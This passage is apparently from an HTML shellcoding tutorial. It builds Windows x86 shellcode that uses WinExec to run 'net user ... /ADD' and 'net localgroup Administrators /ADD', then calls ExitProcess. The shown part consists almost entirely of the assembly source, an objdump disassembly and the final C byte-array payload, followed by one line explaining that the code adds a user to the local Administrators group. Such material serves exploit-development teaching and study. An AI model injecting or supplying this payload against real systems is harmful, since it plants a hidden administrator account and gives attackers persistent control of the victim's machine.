&nbsp;&nbsp;	&nbsp;call ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	;call WinExec(path,showcode)

&nbsp;&nbsp;&nbsp;	&nbsp;xor eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	;zero the register again, clears winexec retval
&nbsp;&nbsp;&nbsp;	&nbsp;push eax
&nbsp;&nbsp;&nbsp;	&nbsp;mov ebx, 0x77e798fd
&nbsp;	&nbsp;call ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	;call ExitProcess(0);


GetCommand:
&nbsp;&nbsp;&nbsp; 	;the N at the end of the db will be replaced with a null character
&nbsp;&nbsp;&nbsp; 	call CommandReturn
	db "cmd.exe /c net user USERNAME PASSWORD /ADD &amp;&amp; net localgroup Administrators /ADD USERNAMEN"
</font>
</pre>
<pre><font face="Courier New">steve hanna@1337b0x:~$ <b>nasm -f elf adduser.asm; ld -o adduser adduser.o; objdump -d adduser</b>

adduser:&nbsp;&nbsp;&nbsp;&nbsp; file format elf32-i386

Disassembly of section .text:

08048080 &lt;_start&gt;:
&nbsp;8048080:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>eb 1b</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 804809d <getcommand>

08048082 <commandreturn>:
&nbsp;8048082:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>5b</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp; %ebx
&nbsp;8048083:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;8048085:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>50</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %eax
&nbsp;8048086:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;8048088:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>88 43 59</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %al,0x59(%ebx)
&nbsp;804808b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>53</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebx
&nbsp;804808c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>bb 35 fd e6 77</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x77e6fd35,%ebx
&nbsp;8048091:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>ff d3</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; *%ebx
&nbsp;8048093:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;8048095:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>50</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %eax
&nbsp;8048096:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>bb fd 98 e7 77</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x77e798fd,%ebx
&nbsp;804809b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>ff d3</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; *%ebx

0804809d <getcommand>:
&nbsp;804809d:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>e8 e0 ff ff ff</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 8048082 <commandreturn>
&nbsp;80480a2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>63 6d 64</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; arpl&nbsp;&nbsp; %bp,0x64(%ebp)
&nbsp;80480a5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>2e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cs
&nbsp;80480a6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gs
&nbsp;80480a7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>78 65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; js&nbsp;&nbsp;&nbsp;&nbsp; 804810e <getcommand+0x71>
&nbsp;80480a9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>20 2f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %ch,(%edi)
&nbsp;80480ab:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>63 20</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; arpl&nbsp;&nbsp; %sp,(%eax)
&nbsp;80480ad:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>6e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outsb&nbsp; %ds:(%esi),(%dx)
&nbsp;80480ae:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gs
&nbsp;80480af:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>74 20</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp; 80480d1 <getcommand+0x34>
&nbsp;80480b1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>75 73</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne&nbsp;&nbsp;&nbsp; 8048126 <getcommand+0x89>
&nbsp;80480b3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gs
&nbsp;80480b4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>72 20</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jb&nbsp;&nbsp;&nbsp;&nbsp; 80480d6 <getcommand+0x39>
&nbsp;80480b6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>55</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebp
&nbsp;80480b7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>53</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebx
&nbsp;80480b8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>45</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ebp
&nbsp;80480b9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>52</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %edx
&nbsp;80480ba:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %esi
&nbsp;80480bb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480bc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4d</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %ebp
&nbsp;80480bd:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>45</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ebp
&nbsp;80480be:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>20 50 41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %dl,0x41(%eax)
&nbsp;80480c1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>53</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebx
&nbsp;80480c2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>53</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebx
&nbsp;80480c3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>57</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %edi
&nbsp;80480c4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %edi
&nbsp;80480c5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>52</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %edx
&nbsp;80480c6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>44</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %esp
&nbsp;80480c7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>20 2f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %ch,(%edi)
&nbsp;80480c9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480ca:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>44</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %esp
&nbsp;80480cb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>44</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %esp
&nbsp;80480cc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>20 26</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %ah,(%esi)
&nbsp;80480ce:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>26 20 6e 65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %ch,%es:0x65(%esi)
&nbsp;80480d2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>74 20</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp; 80480f4 <getcommand+0x57>
&nbsp;80480d4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>6c</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; insb&nbsp;&nbsp; (%dx),%es:(%edi)
&nbsp;80480d5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>6f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outsl&nbsp; %ds:(%esi),(%dx)
&nbsp;80480d6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>63 61 6c</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; arpl&nbsp;&nbsp; %sp,0x6c(%ecx)
&nbsp;80480d9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>67 72 6f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr16 jb 804814b <getcommand+0xae>
&nbsp;80480dc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>75 70</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne&nbsp;&nbsp;&nbsp; 804814e <getcommand+0xb1>
&nbsp;80480de:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>20 41 64</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %al,0x64(%ecx)
&nbsp;80480e1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>6d</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; insl&nbsp;&nbsp; (%dx),%es:(%edi)
&nbsp;80480e2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>69 6e 69 73 74 72 61</b>&nbsp;&nbsp;&nbsp; imul&nbsp;&nbsp; $0x61727473,0x69(%esi),%ebp
&nbsp;80480e9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>74 6f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp; 804815a <getcommand+0xbd>
&nbsp;80480eb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>72 73</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jb&nbsp;&nbsp;&nbsp;&nbsp; 8048160 <getcommand+0xc3>
&nbsp;80480ed:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>20 2f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %ch,(%edi)
&nbsp;80480ef:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41 </b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480f0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>44</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %esp
&nbsp;80480f1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>44</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %esp
&nbsp;80480f2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>20 55 53</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp; %dl,0x53(%ebp)
&nbsp;80480f5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>45</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ebp
&nbsp;80480f6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>52</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %edx
&nbsp;80480f7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %esi
&nbsp;80480f8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480f9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4d</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %ebp
&nbsp;80480fa:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>45</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ebp
&nbsp;80480fb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %esi
</getcommand+0xc3></getcommand+0xbd></getcommand+0xb1></getcommand+0xae></getcommand+0x57></getcommand+0x39></getcommand+0x89></getcommand+0x34></getcommand+0x71></commandreturn></getcommand></commandreturn></getcommand></font>
</pre>
<hr>
<pre><font face="Courier New">Replace the code at the top with:<br>
&nbsp;<b>char code[] =&nbsp;&nbsp;"\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x59\x53\xbb\x35\xfd\xe6\x77"\
		"\xff\xd3\x31\xc0\x50\xbb\xfd\x98\xe7\x77\xff\xd3\xe8\xe0\xff\xff\xff"\
		"\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"\
		"\x65\x72\x20\x55\x53\x45\x52\x4e\x41\x4d\x45\x20\x50\x41\x53\x53\x57"\
		"\x4f\x52\x44\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c"\
		"\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73"\
		"\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x55\x53\x45\x52"\
		"\x4e\x41\x4d\x45\x4e";</b></font></pre><font face="Courier New">
</font><p><font face="Courier New">
When this code is executed it will add a user to the system with the 
specified password, then adds that user to the local Administrators 
group. After that code
is done executing, the parent process is exited by calling ExitProcess.</font>
</p>
<p>
&nbsp;</p>

<h2><font face="Courier New"><a name="as">Advanced Shellcoding</a></font></h2>
